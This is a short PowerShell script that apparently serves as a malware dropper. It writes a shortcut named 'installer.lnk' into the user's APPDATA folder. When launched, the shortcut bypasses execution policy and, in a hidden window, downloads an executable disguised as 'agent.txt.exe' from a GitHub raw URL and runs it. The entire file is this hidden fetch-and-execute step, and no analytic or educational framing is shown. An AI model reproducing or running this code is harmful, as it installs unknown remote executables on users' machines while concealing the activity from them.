$WshShell = New-Object -ComObject WScript.Shell                                               
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\installer.lnk")                    
$Shortcut.TargetPath = "powershell.exe"                                                                              
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& { Invoke-WebRequest -Uri 'https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/agent.txt.exe' -OutFile `"$env:APPDATA\agent.txt.exe`"; Start-Process -FilePath '%APPDATA%\agent.txt.exe' -WindowStyle Hidden }`""                                                                    
$Shortcut.WorkingDirectory = "$env:APPDATA"                                                                         
$Shortcut.Save()       
